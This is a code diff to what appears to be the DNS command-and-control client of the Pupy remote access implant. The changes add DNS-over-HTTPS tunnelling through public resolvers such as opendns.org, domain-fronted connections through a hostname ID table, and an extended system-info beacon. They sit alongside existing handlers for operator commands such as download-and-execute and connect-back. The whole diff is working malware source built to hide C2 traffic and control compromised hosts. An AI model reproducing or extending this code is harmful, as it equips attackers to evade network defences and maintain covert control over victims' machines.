@@ -32,22 +32,25 @@ from picocmd import (
     SystemStatus,
     Sleep, CheckConnect,
     Reexec, Exit, Disconnect,
-    Policy, Kex, SystemInfo,
+    Policy, Kex,
     SetProxy, Connect, DownloadExec,
     PasteLink, CustomEvent,
     OnlineStatusRequest, PupyState,
+    SystemInfoEx, ConnectEx, RegisterHostnameId,
+    AddressTable,
     Error, ParcelInvalidCrc,
     ParcelInvalidPayload,
+    PayloadTooBig,
     Parcel,
     from_bytes, to_bytes
 )
 
 CLIENT_VERSION = 2
 
-try:
-    from network.lib import tinyhttp
-except ImportError:
-    tinyhttp = None
+from network.lib import tinyhttp
+from network.lib import online
+from network.lib import doh as securedns
+
 
 class ProxyInfo(object):
     __slots__ = (
@@ -80,7 +83,9 @@ class ProxyInfo(object):
             self.scheme.lower(), auth, self.ip, self.port)
 
 class DnsCommandsClient(Thread):
-    def __init__(self, domain, key, ns=None, qtype=None, ns_proto=socket.SOCK_DGRAM, ns_timeout=3):
+    def __init__(
+            self, domain, key, doh=False, ns=None, qtype=None,
+            ns_proto=socket.SOCK_DGRAM, ns_timeout=3):
         try:
             import pupy
             self.pupy = pupy
@@ -90,15 +95,16 @@ class DnsCommandsClient(Thread):
             self.pupy = None
             self.cid = 31337
 
-        self.iid = os.getpid() % 65535
+        self.doh = doh
+        self.iid = os.getpid() & 0xFFFF
         self.qtype = qtype
         self._default_qtype = qtype
 
-        if (ns or self.qtype not in (None, 'A', 'AAAA')) and dnslib:
-            if not ns:
+        if (ns or self.doh or self.qtype not in (None, 'A', 'AAAA')) and (dnslib or self.doh):
+            if not ns and not self.doh:
                 raise ValueError('NS must be specified')
 
-            if not type(ns) in (list, tuple):
+            if not self.doh and not type(ns) in (list, tuple):
                 ns = ns.split(':')
                 if len(ns) == 1:
                     ns = (ns[0], 53)
@@ -112,7 +118,21 @@ class DnsCommandsClient(Thread):
             self.ns_socket = None
             self.ns_timeout = ns_timeout
             self.ns_socket_lock = Lock()
-            self.resolve = self._dnslib_resolve
+
+            if self.doh:
+                if not ns:
+                    self.ns = securedns.SecureDNS.available(
+                        'opendns.org', False, online.KNOWN_DNS['opendns.org']
+                    )
+
+                    if self.ns == None:
+                        raise ValueError('All known DoH servers are not working')
+                else:
+                    self.ns = securedns.SecureDNS(self.ns)
+
+                self.resolve = self._doh_resolve
+            else:
+                self.resolve = self._dnslib_resolve
         else:
             if ns:
                 logging.error('dnslib not available, use system resolver')
@@ -146,6 +166,7 @@ class DnsCommandsClient(Thread):
         self.active = True
         self.failed = 0
         self.proxy = None
+        self.address_table = AddressTable()
         self._request_lock = Lock()
 
         Thread.__init__(self)
@@ -188,7 +209,17 @@ class DnsCommandsClient(Thread):
             ) if af_family == family
         )
 
+    def _doh_resolve(self, hostname):
+        qtype = securedns.AAAA
+        if self.qtype == 'A':
+            qtype = securedns.A
+
+        return self.ns.resolve(hostname, qtype)
+
     def _dnslib_resolve(self, hostname):
+        if self.qtype is None:
+            return []
+
         q = dnslib.DNSRecord.question(hostname, self.qtype)
         r = None
 
@@ -275,10 +306,18 @@ class DnsCommandsClient(Thread):
 
         if ldata > 35:
             # 35 -- limit, 4 - nonce, 1 - version, 4 - CID, 2 - IID, 6 - NODE
-            if CLIENT_VERSION > 1 and (ldata - 35 + 4 + 1 + 4 + 2 + 6 < 35):
-                data, data_append = data[:35], data[35:]
+            if CLIENT_VERSION > 1:
+                # Total limit: 52 bytes
+                if (ldata - 35 + 4 + 1 + 4 + 2 + 6 < 35):
+                    data, data_append = data[:35], data[35:]
+                else:
+                    raise PayloadTooBig(
+                        'Page size more than {max_len} bytes ({required_len})',
+                        ldata, 52)
             else:
-                raise ValueError('Too big page size ({})'.format(ldata))
+                raise PayloadTooBig(
+                    'Page size more than {max_len} bytes ({required_len})',
+                    ldata, 35)
 
         nonce = self.nonce
         node_block = ''
@@ -345,7 +384,7 @@ class DnsCommandsClient(Thread):
         return answer
 
     def _request_unsafe(self, commands):
-        parcel = Parcel(*commands)
+        parcel = Parcel(commands)
 
         gen_csum = None
         check_csum = None
@@ -415,10 +454,6 @@ class DnsCommandsClient(Thread):
         return []
 
     def on_pastelink(self, url, action, encoder):
-        if not tinyhttp:
-            logging.error('TinyHTTP is not available')
-            return
-
         proxy = self.proxy
         if type(self.proxy) in (list, tuple):
             if len(self.proxy) > 0:
@@ -479,7 +514,7 @@ class DnsCommandsClient(Thread):
     def on_downloadexec_content(self, url, action, content):
         pass
 
-    def on_connect(self, ip, port, transport, proxy):
+    def on_connect(self, address, port, transport, proxy, hostname=None):
         pass
 
     def on_checkconnect(self, host, port_start, port_end):
@@ -558,7 +593,7 @@ class DnsCommandsClient(Thread):
                     self.on_session_established()
 
             elif isinstance(command, Poll):
-                response = self._request(SystemInfo())
+                response = self._request(SystemInfoEx())
 
                 if len(response) > 0 and not isinstance(response[0], Ack):
                     logging.debug('dnscnc:Submit SystemInfo: response=%s', response)
@@ -587,6 +622,27 @@ class DnsCommandsClient(Thread):
                     command.transport,
                     self.proxy
                 )
+            elif isinstance(command, ConnectEx):
+                address = command.address
+                fronting = None
+
+                if command.address_type == ConnectEx.TARGET_ID:
+                    address = self.address_table.get_address(address)
+                    if command.fronting:
+                        fronting = self.address_table.get_address(command.fronting)
+                else:
+                    address = str(address)
+
+                self.on_connect(
+                    address,
+                    command.port,
+                    command.transport,
+                    self.proxy,
+                    fronting
+                )
+            elif isinstance(command, RegisterHostnameId):
+                logging.debug('Register hostname: %s -> %d', command.hostname, command.id)
+                self.address_table.register(command.hostname, command.id)
             elif isinstance(command, Error):
                 self.on_error(command.error, command.message)
             elif isinstance(command, Disconnect):
